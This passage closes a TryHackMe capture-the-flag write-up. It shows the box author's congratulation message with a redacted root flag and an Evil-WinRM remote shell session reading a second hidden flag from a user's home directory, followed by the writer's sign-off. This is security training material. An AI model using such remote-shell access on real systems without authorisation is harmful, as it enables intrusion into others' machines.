Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{<REDACTED>}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

Another flag can be found inside an exe file in `twilliams` home directory.

```bash
*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{<REDACTED>}

```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

